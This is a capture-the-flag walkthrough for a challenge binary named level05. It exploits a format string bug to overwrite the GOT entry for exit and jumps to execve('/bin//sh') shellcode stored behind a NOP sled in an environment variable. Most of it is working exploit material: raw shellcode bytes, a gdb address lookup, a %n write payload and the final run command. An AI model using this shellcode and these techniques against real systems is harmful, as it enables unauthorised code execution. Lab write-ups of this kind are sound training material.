# Level05

## Vulnerability type:

Format String Vulnerability, Return-to-Libc (RET2LIBC)

## Walkthrough:

The program has a Format String Vulnerability, and it also calls the `exit` function. We can use this to our advantage by modifying the Global Offset Table (GOT) entry for `exit` to redirect program flow.

The issue here is that the program is applying a `to_lowercase` function on the buffer and it impacts the shell code we injected.

To bypass that, need to store the shellcode inside an environment variable and access it from the program. By using the `env -i` command (start with empty env) and a NOP sled, we increase our chances to reach the shellcode.

## Payload:

### Finding the redirection address

```bash
$ env -i SHELLCODE=$(python -c "print('\x90' * 420 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')") gdb ./level05
```

```sh
(gdb) x/20s *((char **)environ)
0xffffdde4:	 "COLUMNS=104"
0xffffddf0:	 "PWD=/home/users/level05"
0xffffde08:	 "LINES=50"
0xffffde11:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220 [...]
    [...]

```
The env variables starting address is `0xffffde11`.

We are going to add `0xD2` (210) to it to aim the middle of our NOP sled.

Final address : `0xFFFFDEE3`

```bash
$ python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%57051x%10$n" + "%8476x%11$n"' > /tmp/05
```

### Execution

```bash
$ cat /tmp/05 - | env -i SHELLCODE=$(python -c "print('\x90' * 420 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')") ./level05
```
